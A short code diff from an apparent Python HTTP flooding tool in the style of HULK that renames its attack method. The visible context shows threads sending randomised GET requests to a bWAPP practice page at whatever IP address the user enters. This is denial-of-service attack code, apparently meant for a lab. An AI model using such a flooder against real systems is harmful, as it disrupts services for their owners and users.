@@ -20,7 +20,7 @@ class DosAttack(threading.Thread):
         self.srcip = '192.168.100.241'
         self.ua = UserAgent()
 
-    def hurk_dos(self):
+    def hulk_dos(self):
         self.string = "".join(random.choice(string.ascii_lowercase) for _ in range(3))
 
         header = "GET /bWAPP/xss_get.php?firstname={}&lastname=&form=submit HTTP/1.1\r\n".format(self.string)
@@ -46,7 +46,7 @@ def main():
     dstip = input("Attack IP Address: ")
     for i in range(1, 1000):
         dos = DosAttack(dstip)
-        t = threading.Thread(target=dos.hurk_dos)
+        t = threading.Thread(target=dos.hulk_dos)
         time.sleep(0.1)
         t.start()
 
